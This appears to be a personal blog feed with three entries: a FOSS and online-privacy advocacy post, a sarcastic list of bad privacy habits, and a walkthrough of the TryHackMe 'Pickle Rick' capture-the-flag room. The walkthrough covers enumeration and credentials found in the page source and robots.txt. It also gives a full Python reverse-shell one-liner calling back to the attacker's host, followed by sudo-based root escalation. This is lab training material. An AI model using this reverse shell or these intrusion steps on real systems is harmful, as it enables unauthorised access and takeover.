entry.title: FOSS
entry.summary:
FOSS

What is FOSS and Why Should You Care?

As the name says, the software is Free and Open Source. Not free as in price but in terms of the freedom which lets you modify and redistribute it based on the license, without having to worry about the legal issues. Open Source is a concept where the source code of the software is open for all which is the opposite to closed source. In case of the closed source the source code is not open to the public except for the developer of the software or the company which distributes it. A software can be opensource and not free at the same time. I don't want to go too much into it. There are TONS of articles about this. I encourage you to read those and get the gist of it. I am happy to direct you to the articles which will give you a better insight into the meaning of the FOSS.

Links to a few articles regarding FOSS and Online Privacy:

  • An article written by RMS, founder of The Free Software Movement

  • The Free Software Foundation

  • FOSSBYTES

  • Itsfoss, A guide to a better linux desktop experience

  • Electronic Frontier Foundation

Why Should You Use FOSS?

1.Better security.

  • Your Windows PC/Laptop has more chances of getting a trojan/virus than a PC/Laptop which is running Linux. I am not saying that Linux is immune to all the threat out there in the wild but it is better than what a closed source platform has to offer. No hate on Windows though but it falls short on fulfilling many aspects of the goals of an OS.

  • Here is why.

  • Another good read.

  • You can argue that all the OS platforms have viruses affecting its users, malware/ransomware attacks, security bugs and backdoors. Well, I agree but not entirely. The system stability and its security is also dependent on its users and their choices.

2.Better user privacy.

  • Hear it from Linus Tech Tips.

  • I can rant all day regarding how the GNU/Linux and other operating systems like BSD(FreeBSB,GhostBSD..) are far better when compared to Windows and OSX in the area of user privacy.

  • In case of Linux you are the one who is in control, unlike in case of Windows where most of the functionalities of the OS are hidden and it is ran by a company which doesn't hesitate to sell their users personal data to a 3rd party service and make money out of it even after making you pay for the licence. You are just forced to follow what they impose on you.

  • Here is a great article describing why Windows makes no effort in protecting their user's privacy when compared to its alternatives. Windows themselves admit that they collect your personal data and they do it legally since it is mentioned in the licence you buy with a copy of Windows. Which totally sucks.

  • In a nutshell I would say Windows is a spyware in disguise.

  • People buy Windows and install willingly on their machines. So the Windows spies on its user with their consent.

  • I prefer GNU/Linux as my primary operating system and I use it for my College work, Photo editing, Programming, Penetration-testing and for many more stuff.

  • GNU/Linux runs very smoothly on both the old and the new hardware. It is far more superior to other OS alternatives like Windows and Mac.

  • It can be pretty daunting to get started with Linux,if in case you are already accustomed to other operating systems. When you learn how to use Linux, its different world where the possibilities are limited only by your imagination.

3.No more forced updates or crashes

  • Forced updates on Windows which can take from few minutes to several hours. During the updates your machine becomes unusable.

  • Users have no idea what gets updated or what gets Installed in case of the Windows.

  • Many proprietary softwares on the Windows constantly bother the user to update to the PRO version. Which is very annoying and unless you have the pro version the features of the application are limited.

  • In case of GNU/Linux there is not a single piece of software which gets installed against the will of the user. You are free to update and upgrade whenever you want. You can use your PC/Laptop during the updates. You can choose what to install and not to.

  • Linux can be configured and made to look as the way you like to be. Literally there is no limit to the customization you can do.

  • Best examples over reddit

  • Forbes article on best examples of customized Linux Desktops

  • Here are my Linux config files

Examples

  • GNU/Linux - An alternative to Microsoft Windows and macOS. It is easy to use and gives more freedom to users. Anyone can install it. There are many distributions in GNU/Linux. I would recommend Ubuntu or Linux Mint for beginners.

  • Inkscape - A vector drawing and editing software.

  • GIMP - A photo editing and manipulation software.

  • Blender - A 3D computer graphics software toolset used for creating animated films, visual effects, art, 3D printed models, motion graphics, interactive 3D applications, virtual reality and computer games. Online Privacy

To stay more safe and private online:

  • Use DuckDuckgo instead of Google.

  • If you feel like you need more accurate results, use the startpage search engine.

  • Use an open source password manager like Bitwardern across devices, which helps you remember strong and unique passwords for all of your online accounts for free.

  • Use the Brave web browser to be protected against malicious ads and sites by default. Brave is a wonderful web-browser which will make your life easy. Its based on Chromium and it is also available on mobile devices.

  • Brave does come with few drawbacks and if you are more of a tech-savy person, you can use Firefox with add-ons like Privacy badger and No-Script.

  • As I recently noticed, the ISPs are trying to monetize on their users' browsing data by spying on them. To overcome this you can use a private DNS like 1.1.1.1 or any OpenNIC Domain Name Servers.

MISC:

  • If you are trying to move to Linux from other platforms and in need of help, feel free to reach out to me. If you are in need of help with anything related to GNU/Linux or FOSS I couldn't be more happier to discuss that with you.

;tags: FOSS OpenSource GNU+Linux

entry.title: How NOT To Use The Internet.
entry.summary:
How NOT To Use The Internet.

How NOT To Use The Internet.

FYI : All the Information provided below is highly sarcastic and I do not recommended to follow any of the methods. Do the opposite instead.

Web Browsers:

  • Proprietary web browsers are way to go.
  • Use the one which comes with your phone by default, if you can.
  • One that doesn't upgrade connections to HTTPS by default.
  • Allow all 3rd party cookies so that you can be tracked around the internet and haunted with ads by a company that you don't know.
  • FIREFOX IS THE BEST. GOOGLE CHROME IS OKAY, I guess.

ISPs and Public Wifis:

  • Make sure you always use public WIFIs for everything important.
  • Get a connection from ISPs which collect all your data and store it indefinitely.
  • Use the ISP as the default DNS resolver so that it will be easy for them to store and sell the data to the 3rd parties.
  • Make it easy for them so censor the internet by using the default DNS resolver provided.
  • I am sure your government won't do this, would it?

Search Engines:

  • Always use Google no matter what.(seriously tho, it gives back the best search results)
  • Bing, Baidu and Yahoo are "Great".
  • Say NO to privacy respecting search engines like DuckDuckgo, SearX

Messaging apps

  • EVERYONE uses that app X . Use it.
  • Don't pay much attention about the TnC of those apps, just hit agree and forget.
  • Always provide unique data back to the app service provider to improve the app experience.
  • I am sure that you have nothing to hide and all you share are some dank memes with few hundred friends.
  • Metadata is not something you should worry about. Laws remain the same forever and don't change depending upon the current power and situations.
  • Apps like Signal are not worth trying.

Email services

  • Gmail for life.
  • Protonmail and Tutanota are for nerds.

Social Media

  • Facebook, Instagram and Twitter are the must have ones. Scroll through the feed all day long to consume propaganda.
  • Mastodon is not worth trying I guess.)
  • Share all your personal details, your current location and post pictures of you and your loved ones, don't try respecting their privacy. All you want are views and likes.
  • Internet doesn't fingerprint your presence, or does it?. Once you put it out there you are in full control, right?

VPNs(Not Scams), right?

  • VPNs ARE THE BEST WAY TO DO PROTECT YOUR DATA AND PRIVACY.
  • VPN vendors don't abuse the naive users by lying about their STATE OF THE ART MILITARY GRADE ENCRYPTION SCHEME AND ZERO LOGGING policies..
  • Zerologging is not a joke.

... To be continued

The internet is vast and the list goes on

;tags: Internet Digital-Privacy Bigtech Sarcasm

entry.title: PICKLE RICK CTF
entry.summary:
PICKLE RICK CTF

Pickle Rick CTF Challenge Walkthrough

https://tryhackme.com/room/picklerick

IP

  • Let's export the IP of the box as a variable, which makes things easier.

export ip=10.10.53.47

Nmap results

``` nmap -sC -sV $ip

port state service version 22/tcp open ssh openssh 7.2p2 ubuntu 4ubuntu2.6 (ubuntu linux; protocol 2.0) | ssh-hostkey: | 2048 a8:a8:45:1a:71:e1:d5:d5:19:37:e9:5b:9d:11:bb:5f (rsa) | 256 19:8a:cc:f2:cd:f2:c9:41:16:2b:97:87:8d:37:39:88 (ecdsa) |_ 256 3a:16:3b:71:7d:73:13:3c:79:df:01:5c:4b:3b:5f:62 (ed25519) 80/tcp open http apache httpd 2.4.18 ((ubuntu)) |http-server-header: apache/2.4.18 (ubuntu) |http-title: rick is sup4r cool service info: os: linux; cpe: cpe:/o:linux:linux_kernel ```

Page source

  • Hit Ctrl+U (to quickly view the webpage source)

  • After reading the source for a bit you get this.

``` Note to self, remember username!

Username: R1ckRul3s ```

dirbuster

``` dirbuster -u http://$ip -l /usr/share/wordlists/dirbuster/directory-list-1.3-medium.txt -v

Starting OWASP DirBuster 1.0-RC1 Starting dir/file list based brute forcing Dir found: / - 200 File found: /login.php - 200 Dir found: /icons/ - 403 Dir found: /assets/ - 200 File found: /assets/bootstrap.min.js - 200 File found: /portal.php - 302 File found: /assets/jquery.min.js - 200 File found: /assets/bootstrap.min.css - 200 Dir found: /icons/small/ - 403 File found: /robots.txt - 200 ```

/robots.txt

  • This looks like the password for the R1ckRul3s account.

Wubbalubbadubdub

Let's try to login

  • Using R1ckRul3s and Wubbalubbadubdub as the password we can login at http://10.10.53.47/login.php

  • You get an interactive commandline

Ughh!! what??

  • After playing around a bit and viewing the source( grep . * ) of the page you can see that few words are blacklisted.

  • Cat command (blacklisted by rick)

  • Command Panel

``` Command disabled to make it hard for future PICKLEEEE RICCCKKKK.

ls -a Sup3rS3cretPickl3Ingred.txt rwxr-xr-x 1 ubuntu ubuntu 17 Feb 10 2019 Sup3rS3cretPickl3Ingred.txt

``` - It is not possible to read the content of the file using cat/head/more command (we can use the less/grep command)

grep . *

  • It dumps out everything in that folder ;)

1st Flag

  • Got the first flag by doing

``` grep . Sup3rS3cretPickl3Ingred.txt

mx. mxxxxxxxx hxxx

```

The clue

grep . clue.txt Look around the file system for the other ingredient.

Getting a reverse shell

  • The webpage cmdline is slow and clumsy

  • reverse shell cheat sheat

  • Trying python3 rev shell

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.8.18.148",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' - We got our rev shell callback

  • On the my machine

  • we can stabilize the shell using few one-liners(I prefer doing it in python)

``` [suntsam@host]$nc -nvlp 1234 listening on 0.0.0.0 1234 Connection received on 10.10.53.47 48592 /bin/sh: 0: can't access tty; job control turned off $ $python -c 'import pty; pty.spawn("/bin/bash")'

hit ctrl+z

[suntsam@host]$stty raw -echo"

[suntsam@host]$fg

[www-data@ip-10-10-53-47]$export TERM=xterm

[www-data@ip-10-10-53-47]$ ```

2nd flag

``` [www-data@ip-10-10-53-47]$cd /home/rick

[www-data@ip-10-10-53-47]$less sxxxxx ixxxxx

1 jxxxx txxx ```

Privilege escalation

  • Guessing that the next flag is in the root folder

  • Run sudo -l to see what you can do what permissions this user we are now.(www-data)

  • sudo -l basically lists the privileges for a user instead of for the invoking user.

  • sudo su will put you into a root environment but it will ask you for your user password instead of the root password

  • Once sudo has given you root privileges, su - can be executed with no password.(which is the case here)

[www-data@ip-10-10-53-47]$sudo -l Matching Defaults entries for www-data on ip-10-10-53-47.eu-west-1.compute.internal: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin User www-data may run the following commands on ip-10-10-53-47.eu-west-1.compute.internal: *** (ALL) NOPASSWD: ALL ***

3rd flag

``` [www-data@ip-10-10-53-47]$sudo su -

root@ip-10-10-53-47:/var/www/html# whoami root

root@ip-10-10-53-47:/var/www/html# cd /root cd /root

root@ip-10-10-53-47:~# ls ls 3rd.txt snap

root@ip-10-10-53-47:~# cat 3rd.txt cat 3rd.txt 3rd ingredient: fxxx jxxx ``` ;tags: RickandMorty CTF Walkthrough Writeup WebChallenge
